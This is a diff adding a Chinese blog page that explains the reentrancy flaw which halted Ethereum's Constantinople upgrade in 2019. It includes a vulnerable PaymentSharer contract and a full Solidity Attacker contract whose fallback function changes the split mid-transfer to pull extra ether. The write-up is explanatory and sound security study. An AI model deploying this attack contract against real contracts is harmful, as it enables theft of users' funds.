@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html class="no-js" lang="zh_CN">
+<head>
+    <!-- Basic Page Needs -->
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <meta name="author" content="">
+    <meta name="google-site-verification" content="4J_Y9YFEPjNLtGbox3HQ3kRL0lMfr9Mh1bwOTjKbCmE" />
+    <meta name="generator" content="Hugo 0.50" />
+    
+    <!-- Mobile Specific Metas -->
+    <meta name="format-detection" content="telephone=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>以太坊君士坦丁堡升级失败原因分析</title>
+    <link rel="icon" href="https://wupeaking.github.io/images/favicon.png">
+
+    <!-- Twitter Bootstrs CSS -->
+    <link rel="stylesheet" href="https://wupeaking.github.io/plugins/bootstrap/bootstrap.min.css">
+    <!-- Ionicons Fonts Css -->
+    <link rel="stylesheet" href="https://wupeaking.github.io/plugins/ionicons/ionicons.min.css">
+    <!-- animate css -->
+    <link rel="stylesheet" href="https://wupeaking.github.io/plugins/animate-css/animate.css">
+    <!-- Hero area slider css-->
+    <link rel="stylesheet" href="https://wupeaking.github.io/plugins/slider/slider.css">
+    <!-- owl craousel css -->
+    <link rel="stylesheet" href="https://wupeaking.github.io/plugins/owl-carousel/owl.carousel.css">
+    <link rel="stylesheet" href="https://wupeaking.github.io/plugins/owl-carousel/owl.theme.css">
+    <!-- Fancybox -->
+    <link rel="stylesheet" href="https://wupeaking.github.io/plugins/fancybox/jquery.fancybox.min.css">
+    <!-- hover -->
+    <link rel="stylesheet" href="https://wupeaking.github.io/plugins/hover/hover-min.css">
+    <!-- template main css file -->
+    <link rel="stylesheet" href="https://wupeaking.github.io/css/style.css">
+</head>
+
+<body>
+
+<section class="top-bar animated-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12">
+                <nav class="navbar navbar-expand-lg navbar-light bg-light">
+                    <a class="navbar-brand" href="https://wupeaking.github.io/">
+                    
+                        <img src="https://wupeaking.github.io/images/logo.png" alt="logo">
+                    
+                    </a>
+                    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
+                        aria-expanded="false" aria-label="Toggle navigation">
+                        <span class="navbar-toggler-icon"></span>
+                    </button>
+
+                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                        <ul class="navbar-nav ml-auto">
+                            <li class="nav-item">
+                                <a class="nav-link" href="https://wupeaking.github.io/">首页</a>
+                            </li>
+                            
+                            <li class="nav-item">
+                                <a class="nav-link" href="/learn">编程</a>
+                            </li>
+                            
+                            <li class="nav-item">
+                                <a class="nav-link" href="/artics">随笔</a>
+                            </li>
+                            
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about">关于</a>
+                            </li>
+                            
+                    </div>
+                </nav>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+<!-- Page Header -->
+<section class="global-page-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="block">
+                    <h2>以太坊君士坦丁堡升级失败原因分析</h2>
+                    <div class="portfolio-meta">
+                        <span>2019-01-22</span>|
+                        <span> Category: ethereum, Constantinople</span>|
+                        <span> website:
+                            <a href=""></a>
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- work details part start -->
+<section class="work-single">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12">
+                
+                <div class="work-single-image">
+                    
+                    <img class="img-fluid w-100" src="https://wupeaking.github.io/images/blog/ethereum.png" alt="work-single-image">
+                </div>
+                
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-lg-8">
+                
+                
+                <div class="work-single-content">
+                    <p>ethereum官方在1月16日发布了一个紧急修复版本, 需要覆盖掉之前的特殊版本v1.8.20 这也就意味着君士坦丁堡版本的硬分叉失败了。 下面我们来看看是什么bug导致此次升级失败。
+</p>
+
+<h3 id="回顾">回顾</h3>
+
+<p>以太坊在18年的12月11号的时候释放了一个特殊的版本(v1.8.20)这个版本准备在主网高度为7080000时进行一次硬分叉，也即是君士坦丁堡版本， 这个版本做了许多改变也包含了一些新的EIPs提案，其中一个导致重大bug提案就是修改SSTORE指令花费的gas数量。由之前的2000Gas减少到200Gas。 下面我们详细说一说为什么这么一个改变会导致出现重大问题。</p>
+
+<h3 id="必要知识">必要知识</h3>
+
+<ul>
+<li>回退函数
+在说明这个bug时， 我们先需要知道以太坊智能合约的fallback函数（回退函数）, 回退函数是合约里的特殊函数，没有名字，不能有参数，没有返回值。类似于下面这个样子。
+```js
+pragma solidity ^0.4.0;</li>
+</ul>
+
+<p>contract SimpleFallback{
+  function() payable{
+    //do something
+  }
+}</p>
+
+<pre><code>这个函数只有在调用智能合约函数不存在时， 或者想此合约进行以太坊转账时没有传递data数据时会调用此函数。 因为之前以太坊出现过DAO时间， 当时一个重要的原因就是因为向合约转换转账时会调用fallback函数引发重大问题， 所以以太坊对此函数做出了一个重大限制就是此函数最大只能花费2300gas，按目前以太坊的花费表来看2300gas也就只能触发一个日志记录。 并不能做一些特别大的事情。 但是君士坦丁堡版本把MMSTORE指令消耗的Gas修改之后, 这问题就不一样了。
+
+- SSTORE指令
+    这个是以太坊的一个存储指令,SSTORE (key   value)  
+ 其实质就是将数据保存到硬盘上。 之前这个指令的最小花费也要2000gas以上。 也就是说一个fallback函数基本上连一次SSTORE指令都执行不成功。
+
+
+我们先看一个智能合约:
+```js
+pragma solidity ^0.5.0;
+
+contract PaymentSharer {
+  mapping(uint =&gt; uint) splits;
+  mapping(uint =&gt; uint) deposits;
+  mapping(uint =&gt; address payable) first;
+  mapping(uint =&gt; address payable) second;
+
+  function init(uint id, address payable _first, address payable _second) public {
+    require(first[id] == address(0) &amp;&amp; second[id] == address(0));
+
+    first[id] = _first;
+    second[id] = _second;
+  }
+
+  function deposit(uint id) public payable {
+    deposits[id] += msg.value;
+  }
+
+  function updateSplit(uint id, uint split) public {
+    require(split &lt;= 100);
+    splits[id] = split;
+  }
+
+  function splitFunds(uint id) public {
+    address payable a = first[id];
+    address payable b = second[id];
+    uint depo = deposits[id];
+    deposits[id] = 0;
+
+    a.transfer(depo * splits[id] / 100);
+    b.transfer(depo * (100 - splits[id]) / 100);
+  }
+}
+</code></pre>
+
+<p>这个合约<code>PaymentSharer</code>功能很简单，就是说我们把以太币存入<code>PaymentSharer</code>中, 按百分比来把存入的以太币分给两个地址。 <code>updateSplit</code>函数就是设置每个地址取出的百分比。 <code>splitFunds</code>函数就是把存入的以太币按百分比分给两个地址, 一个分到<code>depo * splits[id] / 100</code>,  另一个就分到<code>depo * (100 - splits[id]) / 100</code>。  试想一下， 如果在执行完a.transfer(depo * splits[id] / 100);我们人为修改了splits[id]的值是不是就会出现b获得的金额不在是正确的。本来以太坊的虚拟机执行是串行化的。 没有并发问题， 也就是说在执行splitFunds的a.transfer(depo * splits[id] / 100);和b.transfer(depo * (100 - splits[id]) / 100);时splitFunds[i]值是不会发生变化的。但是之前我们说到如果a是一个合约地址, 当向合约地址进行以太币转账时是会调用合约地址的回退函数的, 如果在回退函数中， 我们再次调用此合约的updateSplit函数更新了splits[i]的值, 是不是实现了重放攻击？
+所以我们看下面一个合约代码:</p>
+
+<pre><code class="language-js">pragma solidity ^0.5.0;
+
+import &quot;./PaymentSharer.sol&quot;;
+
+contract Attacker {
+  address private victim;
+  address payable owner;
+
+  constructor() public {
+    owner = msg.sender;
+  }
+
+  function attack(address a) external {
+    victim = a;
+    PaymentSharer x = PaymentSharer(a);
+    x.updateSplit(0, 100);
+    x.splitFunds(0);
+  }
+
+  function () payable external {
+    address x = victim;
+    assembly{
+        mstore(0x80, 0xc3b18fb600000000000000000000000000000000000000000000000000000000)
+        // 如果对这一句不理解的话 这里翻译一下
+        // 其实就是调用合约地址为x gaslimit为10000 发送的data为0xc3b18fb600000000000000000000000000000000000000000000000000000000
+        // data的c3b18fb6就是x合约的updateSplit(uint,uint)的sha3运算值 两个函数入参为(0, 0)
+        // 类似于执行x.updateSplit(0, 0)
+        // 更改了splits[id]值
+        pop(call(10000, x, 0, 0x80, 0x44, 0, 0))
+    }    
+  }
+
+  function drain() external {
+    owner.transfer(address(this).balance);
+  }
+}
+</code></pre>
+
+<p>下面我们来梳理一下调用流程:</p>
+
+<ol>
+<li><p>用户A调用Attacker.attack方法, 在attack方法方法中先调用PaymentSharer.updateSplit(0, 100)更新splits[id]值为100.</p></li>
+
+<li><p>接着调用PaymentSharer.splitFunds函数, 在splitFunds函数中执行a.transfer(depo * splits[id] / 100);
+时, 此时splits[id]为100 所以Attacker合约账户收到的depo个以太币。</p></li>
+
+<li><p>同时在调用Attacker的回退函数, 在回退函数中又调用PaymentSharer.updateSplit(0, 0)更新splits[id]值为0,</p></li>
+
+<li><p>接着执行b.transfer(depo * (100 - splits[id]) / 100);
+所以普通账户b接收到的以太币也是depo。 这样就凭空多提取了depo以太币。</p></li>
+</ol>
+
+<h3 id="总结">总结</h3>
+
+<p>上述就是整个问题的原因, 总结起来就是在类似进行事务操作时, 出现了漏洞导致整个转账过程不再是事务性的。所以如果我们的合约中有修改账户的余额这样的操作一定要谨慎小心。多加考虑。</p>
+
+<h3 id="参考链接">参考链接:</h3>
+
+<ul>
+<li><a href="https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9">https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9</a></li>
+</ul>
+                </div>
+                
+            </div>
+            <div class="col-lg-4">
+                
+                <div class="work-single-sidebar">
+                    
+                    <h5>Clients</h5>
+                    <h6>wupeaking</h6>
+                    
+                    
+                    <h5>date</h5>
+                    <h6>1月22号, 2019</h6>
+                    
+                    <h5>category</h5>
+                    <h6>Investment, Business</h6>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- work details part end -->
+
+
+
+<!-- Footer Section Start -->
+<footer id="footer">
+    <div class="container">
+        <div class="row content-justify-between">
+            <div class="col-md-8 col-12 text-center text-lg-left text-md-left">
+                <p class="copyright">Copyright wupeaking &copy;
+                    <span>
+                    
+                        2018 - 
+                    
+                        <script>document.write(new Date().getFullYear())</script>
+                    </span>
+                </p>
+                
+            </div>
+            <div class="col-md-4 col-12">
+                <!-- Social Media -->
+                <ul class="social text-center text-md-right text-lg-right">
+                
+                    <li>
+                        <a href="https://facebook.com" target="_blank">
+                            <i class="ion-social-facebook"></i>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://twitter.com" target="_blank">
+                            <i class="ion-social-twitter"></i>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://linkedin.com" target="_blank">
+                            <i class="ion-social-linkedin"></i>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://googleplus.com" target="_blank">
+                            <i class="ion-social-googleplus"></i>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://github.com/wupeaking" target="_blank">
+                            <i class="ion-social-github"></i>
+                        </a>
+                    </li>
+                
+                </ul>
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- footer section end -->
+
+<!-- jquery -->
+<script src="https://wupeaking.github.io/plugins/jQurey/jquery.min.js"></script>
+<!-- Form Validation -->
+<script src="https://wupeaking.github.io/plugins/form-validation/jquery.form.js"></script>
+<script src="https://wupeaking.github.io/plugins/form-validation/jquery.validate.min.js"></script>
+<!-- owl carouserl js -->
+<script src="https://wupeaking.github.io/plugins/owl-carousel/owl.carousel.min.js"></script>
+<!-- bootstrap js -->
+<script src="https://wupeaking.github.io/plugins/bootstrap/bootstrap.min.js"></script>
+<!-- wow js -->
+<script src="https://wupeaking.github.io/plugins/wow-js/wow.min.js"></script>
+<!-- slider js -->
+<script src="https://wupeaking.github.io/plugins/slider/slider.js"></script>
+<!-- Fancybox -->
+<script src="https://wupeaking.github.io/plugins/fancybox/jquery.fancybox.min.js"></script>
+<!-- template main js -->
+<script src="https://wupeaking.github.io/js/main.js"></script>
+</body>
+
+</html>
